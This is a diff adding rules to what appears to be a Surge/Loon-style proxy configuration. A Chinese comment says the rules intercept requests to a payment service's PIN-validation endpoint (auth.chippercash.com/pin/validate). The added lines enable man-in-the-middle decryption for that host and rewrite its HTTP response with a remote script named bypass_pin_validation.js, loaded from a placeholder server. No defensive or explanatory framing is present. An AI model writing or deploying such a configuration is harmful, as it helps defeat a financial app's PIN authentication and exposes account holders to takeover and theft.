@@ -4,3 +4,12 @@
 
 [mitm]
 hostname = auth.chippercash.com
+
+
+
+[Script]
+# 拦截 https://auth.chippercash.com/pin/validate 请求并执行脚本
+bypass_pin_validation = type=http-response,pattern=^https:\/\/auth\.chippercash\.com\/pin\/validate,requires-body=1,max-size=0,script-path=https://your-server.com/bypass_pin_validation.js
+
+[MITM]
+hostname = auth.chippercash.com
